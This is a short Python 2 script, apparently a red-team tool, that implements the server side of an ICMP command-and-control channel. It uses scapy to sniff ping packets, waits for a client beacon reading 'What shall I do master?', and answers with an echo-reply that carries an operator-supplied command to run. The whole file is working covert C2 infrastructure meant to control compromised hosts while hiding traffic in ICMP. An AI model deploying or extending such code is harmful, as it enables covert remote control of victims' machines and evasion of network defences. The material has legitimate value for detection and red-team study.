#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

import sys
import signal
from scapy.all import *

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'
	sys.exit()


def main(argv):
	if len(argv) < 1:
                print "----------------------------"
                print "PingC2 Usage"
                print " ./pingc2.py <command>"
                print "----------------------------"
                exit()
	
	conf.verb = 0
	count = 1
	filter = "icmp"
	print "[*] Sniffing with filter (%s) for %d bytes" % (filter, int(count))

	while True:
		signal.signal(signal.SIGINT, handler)
		try:
			packet = sniff(count,filter=filter)
		except KeyboardInterrupt:
        		print "Bye"
        		sys.exit()
		for p in packet:
			#p.show2()
			try:
				request = p['Raw'].load
				ip_id = p['IP'].id
				icmp_id = p['ICMP'].id
				print "[*] Request: " + request
				if request == 'What shall I do master?':
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sys.argv[1]
					print "[*] Response sent: " + sys.argv[1]
					#resp.show2()
					send(resp)
				elif request == 'sysinfo':
					print "[*] Client sent sysinfo"
				else:	
					print "[**] Client not recognized"
			except KeyboardInterrupt:
        			print "Bye"
        			sys.exit()				
			except: 
				print "[X] ERROR: ", sys.exc_info()[0]  

if __name__ == "__main__":
   main(sys.argv[1:])
